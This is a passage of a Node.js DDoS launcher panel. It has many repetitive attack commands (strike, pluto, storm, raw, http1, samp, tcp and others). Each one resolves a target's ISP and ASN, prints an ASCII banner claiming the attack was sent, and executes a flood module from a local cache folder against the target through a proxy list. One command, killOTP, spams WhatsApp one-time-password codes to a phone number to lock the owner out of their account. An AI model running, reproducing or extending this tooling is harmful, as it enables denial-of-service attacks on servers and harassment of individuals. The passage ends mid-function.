⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

========================================================================
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m java \x1b[1;37m]
\x1b[1;37m  Target Details
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/10`);
exec(`node ${metode} ${target} ${duration} 32 10 proxy.txt`)
sigma()
};
// [========================================] //
async function strike(args) {
  if (args.length < 3) {
    console.log(`Example: .strike <target> <port>  <duration>
strike https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

========================================================================
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m strike \x1b[1;37m]
\x1b[1;37m  Target Details
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/11`);
exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
sigma()
};
// [========================================] //
async function pluto(args) {
  if (args.length < 3) {
    console.log(`Example: .pluto <target> <port>  <duration>
pluto https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

========================================================================
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m pluto \x1b[1;37m]
\x1b[1;37m  Target Details
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/12`);
exec(`node ${metode} ${target} ${duration} 32 10 proxy.txt`)
sigma()
};
// [========================================] //
async function storm(args) {
  if (args.length < 3) {
    console.log(`Example: .storm <target> <port>  <duration>
storm https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

========================================================================
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m storm \x1b[1;37m]
\x1b[1;37m  Target Details
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/13`);
exec(`node ${metode} ${target} ${duration} 32 10 proxy.txt`)
sigma()
};
// [========================================] //
async function raw(args) {
  if (args.length < 3) {
    console.log(`Example: .raw <target> <port>  <duration>
raw https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

========================================================================
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m raw \x1b[1;37m]
\x1b[1;37m  Target Details
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]

`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/14`);
exec(`node ${metode} ${target} ${duration}`)
sigma()
};
// [========================================] //
async function stars(args) {
  if (args.length < 3) {
    console.log(`Example: .stars <target> <port>  <duration>
flood https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

========================================================================
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m stars \x1b[1;37m]
\x1b[1;37m  Target Details
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/15`);
exec(`node ${metode} ${target} ${duration} 64 10 proxy.txt`)
sigma()
};
// [========================================] //
async function http1(args) {
  if (args.length < 3) {
    console.log(`Example: .http <target> <port>  <duration>
http1 https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

========================================================================
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m http1 \x1b[1;37m]
\x1b[1;37m  Target Details
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/16`);
exec(`node ${metode} ${target} ${duration}`)
sigma()
};
// [========================================] //
async function killOTP(args) {
  if (args.length < 2) {
    console.log(`Example: kill-otp <target> <duration>
kill-otp 628xxx 120`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀
   
                    OTP Killer Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}

Spamming WhatsApp OTP That Can Annoy Someone Or Maybe Make Them Cannot Login`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/21`);
exec(`node ${metode} +${target} ${duration}`)
sigma()
};
// [========================================] //
async function samp(args) {
  if (args.length < 3) {
    console.log(`Example: .samp <target> <port> <duration>
samp 123.456.78.910 7777 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

                    SA MP Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : SAMP Flooder
Creator  : Darknet`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/22`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function tcp(args) {
  if (args.length < 3) {
    console.log(`Example: tcp <target> <duration>
tcp 123.456.78.910 120`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
